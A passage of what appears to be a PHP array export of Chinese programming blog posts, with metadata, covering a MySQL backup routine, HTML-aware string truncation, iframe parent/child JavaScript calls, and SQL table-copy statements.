&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//去掉最后一个逗号和空格
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqlStr&nbsp;=&nbsp;substr($sqlStr,0,strlen($sqlStr)-2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqlStr&nbsp;.=&nbsp;&quot;);\\\\r\\\\n&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqldump&nbsp;.=&nbsp;$sqlStr;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//file_put_contents($to_file_name,$sqlStr,FILE_APPEND);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//释放资源
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mysql_free_result($res);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sqldump&nbsp;.=&nbsp;&#39;\\\\r\\\\n&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//file_put_contents($to_file_name,&quot;\\\\r\\\\n&quot;,FILE_APPEND);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$filename&nbsp;=&nbsp;&#39;ciblog_&#39;.&nbsp;date(&#39;Ymd_His&#39;,&nbsp;time()).&#39;.sql&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-Type:&nbsp;text/x-sql&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header(&quot;Content-Disposition:attachment;filename=&quot;.$filename);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$sqldump;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p><br/></p>',
            'keyword' => 'php,数据库,备份,导出,sql',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:44:47',
          ),
          15 => 
          array (
            'id' => '70',
            'uid' => '1',
            'title' => 'php无损截取包括html标签的字符串',
            'content' => '<p>因为本博客在文章列表时，需要显示一段内容，但是好多情况是有html标签等，或者是里面带有链接、图片的标签，于是在网上找了很多，发现都不尽人意，就自己写了一个适合自己使用的：</p><pre class=\\"brush:php;toolbar:false\\">/**
&nbsp;*&nbsp;字符串切割+过滤+转换
&nbsp;*
&nbsp;*&nbsp;功能：截取字符串（支持中文）
&nbsp;*&nbsp;如果截取的字符串中不包含html标签，则正常截取
&nbsp;*&nbsp;如果字符串中包括img标签，则先进行过去标签，截取后，将标签位置放回,截取的字符串则会保留完整的html标签
&nbsp;*
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$string
&nbsp;*&nbsp;@param&nbsp;unknown&nbsp;$length
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$replace
&nbsp;*&nbsp;@return&nbsp;string
&nbsp;*/
function&nbsp;cutTab($string,&nbsp;$length=&#39;15&#39;,&nbsp;$dot&nbsp;=&nbsp;&#39;…&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$_lenth&nbsp;=&nbsp;mb_strlen($string,&nbsp;&quot;utf-8&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;$text_str&nbsp;=&nbsp;preg_replace(&quot;/&lt;img.*?&gt;/si&quot;,&quot;&quot;,$string);
&nbsp;&nbsp;&nbsp;&nbsp;$text_lenth&nbsp;=&nbsp;mb_strlen($text_str,&nbsp;&quot;utf-8&quot;)&nbsp;-&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($text_lenth&nbsp;&lt;=&nbsp;$length)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;stripcslashes($string);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if(strpos($string,&nbsp;&#39;&lt;img&#39;)&nbsp;===&nbsp;false){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;mb_substr($string,&nbsp;0,&nbsp;$length,&nbsp;&#39;UTF-8&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;stripcslashes($res).$dot;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//计算标签位置
&nbsp;&nbsp;&nbsp;&nbsp;$html_start&nbsp;=&nbsp;ceil(strpos($string,&nbsp;&#39;&lt;img&#39;)&nbsp;/&nbsp;3);
&nbsp;&nbsp;&nbsp;&nbsp;$html_end&nbsp;=&nbsp;ceil(strpos($string,&nbsp;&#39;/&gt;&#39;)&nbsp;/&nbsp;3);
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($length&nbsp;&lt;&nbsp;$html_start)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;mb_substr($string,&nbsp;0,&nbsp;$length,&nbsp;&#39;UTF-8&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;stripcslashes($res).$dot;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($length&nbsp;&gt;&nbsp;$html_start)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res_html&nbsp;=&nbsp;mb_substr($text_str,&nbsp;0,&nbsp;$length-1,&nbsp;&#39;UTF-8&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;preg_match(&#39;/&lt;img[^&gt;]*\\\\&gt;/&#39;,$string,$result_html);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$before&nbsp;=&nbsp;mb_substr($res_html,&nbsp;0,&nbsp;$html_start,&nbsp;&#39;UTF-8&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$after&nbsp;=&nbsp;mb_substr($res_html,&nbsp;$html_start,&nbsp;mb_strlen($res_html,&nbsp;&quot;utf-8&quot;),&nbsp;&#39;UTF-8&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$before.$result_html[0].$after;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;stripcslashes($res).$dot;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
}</pre><p><br/></p>',
            'keyword' => 'php,截取,html,标签,字符串',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:43:09',
          ),
          16 => 
          array (
            'id' => '69',
            'uid' => '1',
            'title' => 'iframe里面的页面调用父窗口,左右窗口js函数的方法',
            'content' => '<p>iframe里面的页面调用父窗口,左右窗口js函数的方法<br/>实现iframe内部页面直接调用该iframe所属父窗口自定义函数的方法。<br/>比如有A窗口，A内有个IFRAME B，B里面的装载的是C页面，这时C要直接调用A里面的一个自定义函数AFUN();<br/>那么只要在C页面中写如下JS函数就可以了：<br/>window.parent.AFUN();<br/>如果AFUN()有参数也可以直接传递合适的参数进去。<br/>例如：<br/>修改父窗口控件属性<br/>window.parent.document.getElementById(&#39;frmright&#39;).src=window.parent.document.getElementById(&#39;frmrightsrc&#39;).value;<br/>调用父窗口函数<br/>window.parent.POPUP(&#39;bigFram&#39;);<br/><br/>父窗口调用iframe子窗口方法<br/>&lt;iframe name=&quot;myFrame&quot; src=&quot;child.html&quot;&gt;&lt;/iframe&gt;<br/>myFrame.window.functionName();<br/>iframe子窗口调用父窗口方法<br/>parent.functionName();<br/><br/><br/>////////////////////////////////////<br/>用js互相调用iframe页面内的js函数<br/>一个html页面，分成左右两块，左边为导航栏，右边为需要显示的内容，代码如下：<br/>左栏的代码为：<br/>&lt;IFRAME frameBorder=0 id=frmTitleLeft name=framLeft src=&quot;left.html&quot; style=&quot;HEIGHT: 100%; width:180px;&quot;&gt;<br/>连接到left.html<br/>比如右栏中有一个函数right（），我要在左栏的链接中调用right（）函数，该如何实现呢<br/>1，首先leftframe是内嵌在容器页index.html中的，因此需要先返回到index这一级别，并取得rightframe对象<br/>&nbsp;&nbsp;&nbsp; var frames=window.parent.window.document.getElementById(&quot;frameid&quot;);<br/>2，要能执行其页面中的函数，必须要获得window对象，这里有一个重要的对象contentWindow，获得这个对象，即可执行其中的函数了，如<br/>&nbsp;&nbsp;&nbsp; frames.contentWindow.right();<br/>以上代码兼容IE6，Firefox3，chrome2.0，均成功通过测试，IE7没试过，不过应该没问题。<br/>3.例如：<br/>window.parent.document.getElementById(&#39;leftFrame&#39;).contentWindow.JSMenu(&#39;MenuUl&#39;+Sid);<br/>window.parent.frames[&quot;leftFrame&quot;].JSMenu(&#39;MenuUl&#39;+Sid);<br/><br/>还有下面一种，没测试过<br/><br/>并不是象通常那样iframeName.test();——test()为iframe里的方法。因为要写一个通用一点的东西，所以是从一个配置文件中动态获取到iframe的id。然后调用里面的方法。可是不成功。相烦帮忙看一看。代码如下： <br/></p><pre class=\\"brush:js;toolbar:false\\">&lt;iframe&nbsp;&nbsp;&nbsp;id=&quot;iframe1&quot;&gt;&lt;/iframe&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
var&nbsp;&nbsp;&nbsp;cs&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;document.all;&nbsp;&nbsp;
for(var&nbsp;&nbsp;&nbsp;i&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;0;&nbsp;&nbsp;&nbsp;i&nbsp;&nbsp;&nbsp;&lt;&nbsp;&nbsp;&nbsp;cs.length;&nbsp;&nbsp;&nbsp;i++)&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if(cs.tagName.toUpperCase()&nbsp;&nbsp;&nbsp;==&nbsp;&nbsp;&nbsp;&quot;IFRAME&quot;)&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(cs.id&nbsp;&nbsp;&nbsp;==&nbsp;&nbsp;&nbsp;&quot;iframe1&quot;)&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(frmDealData);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(cs);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.frames.iframe1.setScreenletStatus(iframeLayoutLvl);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.frames.cs.setScreenletStatus(iframeLayoutLvl);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
}</pre><p>第一句调用是成功的。&nbsp;&nbsp; <br/>可第二句就不成功。&nbsp;&nbsp; <br/>如果在只能取得cs对象的情况下，该怎么调用<strong style=\\"color:black;background-color:#ffff66\\">iframe</strong>里的<strong style=\\"color:black;background-color:#ff66ff\\">方法</strong>？谢谢</p><p>------------------------------------ <br/>不要用id,用name&nbsp;&nbsp; <br/>window.frames[cs].fun()</p><p><br/></p>',
            'keyword' => 'iframe,父窗口,左右窗口',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:38:45',
          ),
          17 => 
          array (
            'id' => '68',
            'uid' => '1',
            'title' => 'js 处理 ie和firefox window.frames 兼容问题',
            'content' => '<p>在做项目的时候网页里嵌套iframe时想对iframe对象进行操作时ie和firefox是不同的。</p><p>&nbsp;</p><p>例如：</p><p>&lt;iframe id=&quot;xx1&quot;&nbsp; scrolling=&quot;auto&quot; frameborder=&quot;0&quot; width=&quot;100%&quot; height=&quot;100%&quot; src=<a>http://</a>www.xxx.com&gt;&lt;/iframe&gt;</p><p>&nbsp;</p><p>js:</p><p>window.frames[&#39;xx1&#39;].document.location.replace(&#39;http://www.jjj.com&#39;);</p><p>&nbsp;</p><p>在ie下是没有问题的可是在firefox下就不行了，错误提示是找不到 window.frames[&#39;xx1&#39;]对象。</p><p>&nbsp;</p><p>这是怎么回事呢，刚开始我找了很长时间一直没有找到好的解决方法。后来经过我不歇的努力终于成功解决！</p><p>&nbsp;</p><p>原因是ie和firefox的内核是不一样的，ie是用过id来生成对象，可是firefox是通过name来生成对象。</p><p>所以在iframe加个name就行了。</p><p>&nbsp;</p><p>&lt;iframe id=&quot;xx1&quot;&nbsp; <span style=\\"color: #ff0000;\\">name=&quot;xx1&quot;</span> scrolling=&quot;auto&quot; frameborder=&quot;0&quot; width=&quot;100%&quot; height=&quot;100%&quot; src=<a>http://</a>www.xxx.com&gt;&lt;/iframe&gt;</p><p>&nbsp;</p><p><br/></p>',
            'keyword' => 'js,ie,firefox,window.frames,兼容',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:37:18',
          ),
          18 => 
          array (
            'id' => '67',
            'uid' => '1',
            'title' => 'mysql中复制表数据（select into from和insert into select）',
            'content' => '<h3><span style=\\"padding: 0px; margin: 0px; line-height: 28px; font-size: 21px; font-family: 宋体;\\">一.简介</span><br/></h3><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"font-size: 14px;\\">Insert是T-sql中常用语句，Insert INTO table(field1,field2,...) values(value1,value2,...)这种形式的在应</span></p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"font-size: 14px;\\">用程序开发中必不可少。&nbsp;</span></p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">但我们在开发、测试过程中，经常会遇到需要表复制的情况，如将一个table1的数据的部分字段复制到</span></p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">table2中，或者将整个table1复制到table2中，这时候我们就要使用select into &nbsp;from和 insert into select</span><span style=\\"font-size: 14px;\\">&nbsp;表复制语句了。</span></p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\"><br/></span></p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-family: Verdana, sans-serif, 宋体; line-height: 23px;\\"></span><span style=\\"padding: 0px; margin: 0px; font-family: Verdana, sans-serif, 宋体; line-height: 23px;\\"></span></p><p><span style=\\"padding: 0px; margin: 0px; color: rgb(51, 51, 51); line-height: 22.5px; background-color: rgb(255, 255, 255);\\"></span><span style=\\"color: rgb(51, 51, 51); line-height: 22.5px; background-color: rgb(255, 255, 255);\\"></span></p><p><span id=\\"OSC_h3_2\\"></span></p><h3><span style=\\"padding: 0px; margin: 0px; font-size: 21px; font-family: 宋体;\\">二.方式1（常用）：insert into select</span></h3><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">1、语句形式：</span></p><pre class=\\"brush:sql;toolbar:false\\">Insert&nbsp;into&nbsp;Table2(field1,field2,...)&nbsp;select&nbsp;value1,value2,...&nbsp;from&nbsp;Table1</pre><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">2、要求：</span></p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">目标表Table2必须存在；</span></p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\">由于目标表Table2已经存在，所以我们除了插入源表Table1的字段外，还可以插入常量；</p><p style=\\"padding: 0px; margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; letter-spacing: 0.5px; color: rgb(51, 51, 51); white-space: normal; background-color: rgb(255, 255, 255);\\">3、例子：</p><pre class=\\"brush:sql;toolbar:false\\">--1.创建测试表&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create&nbsp;TABLE&nbsp;Table1&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONSTRAINT&nbsp;[PK_Table1]&nbsp;PRIMARY&nbsp;KEY&nbsp;CLUSTERED&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;ASC&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;ON&nbsp;[PRIMARY]&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;create&nbsp;TABLE&nbsp;Table2&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;int,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONSTRAINT&nbsp;[PK_Table2]&nbsp;PRIMARY&nbsp;KEY&nbsp;CLUSTERED&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;ASC&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;ON&nbsp;[PRIMARY]&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--2.创建测试数据&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;赵&#39;,&#39;asds&#39;,&#39;90&#39;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;钱&#39;,&#39;asds&#39;,&#39;100&#39;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;孙&#39;,&#39;asds&#39;,&#39;80&#39;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;李&#39;,&#39;asds&#39;,null)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;select&nbsp;*&nbsp;from&nbsp;Table2&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--3.INSERT&nbsp;INTO&nbsp;SELECT语句复制表数据&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table2(a,&nbsp;c,&nbsp;d)&nbsp;select&nbsp;a,c,5&nbsp;from&nbsp;Table1&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--4.显示更新后的结果&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;select&nbsp;*&nbsp;from&nbsp;Table2&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--5.删除测试表&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;drop&nbsp;TABLE&nbsp;Table1&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;drop&nbsp;TABLE&nbsp;Table2</pre><p><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">也可参考一下sql：</span><br/></p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;INTO&nbsp;`um_region`(`region_id`,`parent_id`,`name`,`sort`,`type`)
SELECT&nbsp;`region_id`,`parent_id`,`name`,`sort`,`type`&nbsp;FROM&nbsp;`省$`</pre><h3><span style=\\"padding: 0px; margin: 0px; font-size: 21px; font-family: 宋体;\\">三.方式2：select into from</span></h3><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">1、语句形式：</span></p><pre class=\\"brush:sql;toolbar:false\\">SELECT&nbsp;vale1,&nbsp;value2&nbsp;into&nbsp;Table2&nbsp;from&nbsp;Table1</pre><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\"><span style=\\"padding: 0px; margin: 0px; font-size: 14px;\\">2、要求：</span></p><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\">目标表Table2不存在；</p><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\">因为在插入时会自动创建表Table2，并将Table1中指定字段数据复制到Table2中。</p><p style=\\"margin-top: 8px; margin-bottom: 8px; line-height: 22.5px; white-space: normal; padding: 0px; letter-spacing: 0.5px; color: rgb(51, 51, 51); background-color: rgb(255, 255, 255);\\">3、例子：</p><pre class=\\"brush:sql;toolbar:false\\">--1.创建测试表&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create&nbsp;TABLE&nbsp;Table1&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;varchar(10),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONSTRAINT&nbsp;[PK_Table1]&nbsp;PRIMARY&nbsp;KEY&nbsp;CLUSTERED&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;ASC&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;)&nbsp;ON&nbsp;[PRIMARY]&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--2.创建测试数据&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;赵&#39;,&#39;asds&#39;,&#39;90&#39;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;钱&#39;,&#39;asds&#39;,&#39;100&#39;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;孙&#39;,&#39;asds&#39;,&#39;80&#39;)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;Insert&nbsp;into&nbsp;Table1&nbsp;values(&#39;李&#39;,&#39;asds&#39;,null)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--3.SELECT&nbsp;INTO&nbsp;FROM语句创建表Table2并复制数据&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;select&nbsp;a,c&nbsp;INTO&nbsp;Table2&nbsp;from&nbsp;Table1&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--4.显示更新后的结果&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;select&nbsp;*&nbsp;from&nbsp;Table2&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;GO&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;--5.删除测试表&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;drop&nbsp;TABLE&nbsp;Table1&nbsp;
